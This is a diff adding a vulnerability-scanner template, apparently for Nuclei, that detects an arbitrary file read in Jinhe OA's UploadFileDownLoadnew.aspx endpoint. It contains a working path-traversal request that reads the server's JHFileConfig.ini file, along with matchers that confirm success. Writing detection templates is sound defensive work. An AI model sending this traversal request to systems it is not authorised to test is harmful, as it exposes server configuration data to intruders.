@@ -1,0 +1,27 @@
+id: jinhe-oa-uploadfiledownloadnew-file-read
+info:
+  name: Jinhe OA UploadFileDownLoadnew Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: file-read
+  description: |
+    This template detects an arbitrary file read vulnerability in the Jinhe OA system's UploadFileDownLoadnew.aspx endpoint.
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/c6/JHSoft.Web.CustomQuery/UploadFileDownLoadnew.aspx/?FilePath=../Resource/JHFileConfig.ini"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "[JHFile]"
+          - "FolderTotal="
+        part: body
+      - type: word
+        words:
+          - "application/octet-stream"
+        part: header
